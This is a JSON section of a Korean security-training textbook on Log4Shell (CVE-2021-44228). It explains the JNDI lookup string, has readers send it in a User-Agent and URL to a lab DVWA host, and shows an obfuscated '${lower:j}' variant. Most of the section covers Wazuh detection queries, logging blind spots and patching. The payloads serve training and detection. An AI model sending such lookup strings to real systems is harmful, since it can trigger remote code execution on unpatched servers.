@@ -1,0 +1,112 @@
+{
+  "title": "7.3  Log4Shell 조회 문자열",
+  "kind": "body",
+  "blocks": [
+    {
+      "type": "p",
+      "text": "Log4Shell(CVE-2021-44228)은 Java 로그 라이브러리 Log4j 2가 로그로 남길 문자열 안의 조회 표현식을 해석하다 외부 서버의 코드를 불러와 실행할 수 있었던 취약점이다. JNDI는 Java에서 이름으로 자원을 조회하는 인터페이스이고, LDAP는 디렉터리 조회 프로토콜이다. [4]"
+    },
+    {
+      "type": "code",
+      "text": "${jndi:ldap://192.168.0.202:1389/a}"
+    },
+    {
+      "type": "p",
+      "text": "${…}는 조회 표현식이고 ldap:// 뒤는 조회할 서버(192.168.0.202의 1389 포트)와 자원 이름(a)이다. 취약한 Log4j가 이 문자열을 로그로 남기면 그 주소로 LDAP 조회를 보낸다. 요청을 보낸 출발지와 조회 목적지는 역할이 다르며 다른 주소일 수 있다."
+    },
+    {
+      "type": "image",
+      "path": "assets/figures/chapter07/log4shell.png",
+      "caption": "도식 7-5. 입력 문자열의 처리와 외부 조회.",
+      "width_mm": 127,
+      "asset": "05583e95beb5cfdeb1da09651594d7298228d63a436e1bfb268e521e1b08b61d.png"
+    },
+    {
+      "type": "list",
+      "style": "number",
+      "items": [
+        "Network conditions의 User-Agent를 위 문자열로 바꾼다(B07-03, 6.3과 같은 방법).",
+        "http://dvwa.xocrange.lab/?q=%24%7Bjndi%3Aldap%3A%2F%2F192.168.0.202%3A1389%2Fa%7D를 한 번 요청한다(B07-04). %24는 $, %7B·%7D는 중괄호, %3A는 :, %2F는 /이다.",
+        "Request Headers의 User-Agent와 Request URL의 q 값, Status Code를 공격 일지에 적고 **Use browser default**를 다시 켠다."
+      ]
+    },
+    {
+      "type": "image",
+      "path": "assets/screens/chapter07/log4-raw.png",
+      "caption": "화면 7-3. URL과 User-Agent의 JNDI 문자열.",
+      "width_mm": 127,
+      "asset": "f716defd8a335be56e091a78f48e986a17f51684d7d772be0543f9eae432f2db.png"
+    },
+    {
+      "type": "query",
+      "id": "Q07-03",
+      "where": "Windows · Discover · wazuh-alerts-*",
+      "purpose": "원문 또는 URL에 jndi가 들어간 요청을 찾는다.",
+      "text": "agent.name: \"web\"\nAND (full_log: *jndi* OR data.url: *jndi*)",
+      "syntax": "User-Agent는 별도 필드가 없으므로 full_log에서 찾는다. 괄호로 OR를 묶어 agent.name 조건이 양쪽에 적용되게 한다.",
+      "result": "강의 자료에서는 403, 규칙 31101이었다. 같은 요청의 WAF 감사 기록(5.6의 방법)에서 차단 메시지를 확인한다."
+    },
+    {
+      "type": "p",
+      "text": "공격자는 탐지를 피하려고 ${${lower:j}ndi:…}처럼 글자를 쪼갠다. 안쪽 ${lower:j}가 j로 해석되어 바깥에서 jndi가 완성되므로, 원문에는 연속된 jndi가 없다."
+    },
+    {
+      "type": "query",
+      "id": "Q07-04",
+      "where": "Windows · Discover · wazuh-archives-*",
+      "purpose": "쪼갠 형태와 인코딩된 ${까지 후보를 넓힌다.",
+      "text": "agent.name: \"web\"\nAND (full_log: *jndi* OR full_log: *lower*\nOR data.url: *%24%7B*)",
+      "syntax": "wazuh-archives-*에서 찾는다. 후보 검색이므로 정상 문자열도 섞일 수 있다. 원문을 펼쳐 전체 표현식을 읽는다.",
+      "result": "강의 자료의 변형 요청(X-Api-Version 헤더에 ${${lower:j}ndi:…}, User-Agent에 rmi 조회)은 302였다."
+    },
+    {
+      "type": "box",
+      "kind": "blind",
+      "text": [
+        "Apache의 combined 접속 로그는 User-Agent와 Referer만 기록하고 X-Api-Version 같은 다른 헤더는 기록하지 않는다. 그 헤더에 들어간 조회 문자열은 접속 로그와 경보에 나타나지 않는다. WAF 감사 기록에 요청 헤더가 저장되었는지 확인한다. [2]"
+      ]
+    },
+    {
+      "type": "table",
+      "head": [
+        "단계",
+        "이 사례에서 확인할 것"
+      ],
+      "rows": [
+        [
+          "1 입력",
+          "URL·User-Agent·감사 기록의 조회 문자열과 목적지"
+        ],
+        [
+          "2 처리",
+          "403(차단)·302(이동)와 응답 본문"
+        ],
+        [
+          "3 변화",
+          "DVWA는 PHP 애플리케이션이다. Java·Log4j를 쓰는 서비스인지부터 확인한다."
+        ],
+        [
+          "4 결과",
+          "서버가 192.168.0.202:1389로 통신했는지(방화벽·DNS 기록), 이후 Java 하위 프로세스·새 파일"
+        ]
+      ],
+      "widths": [
+        20,
+        107
+      ],
+      "keep": true
+    },
+    {
+      "type": "p",
+      "text": "대응은 영향받는 Log4j를 수정 버전으로 업데이트하는 것이 우선이다. 업무에 필요 없는 외부 LDAP·RMI 통신을 막고, 이미 발생한 조회 기록을 보존한다. [4]"
+    }
+  ],
+  "break": false,
+  "level": "section",
+  "source": {
+    "file": "volume01-chapter07.json",
+    "section_index": 3,
+    "revision": "REV01",
+    "mapping_status": "pending-review"
+  }
+}
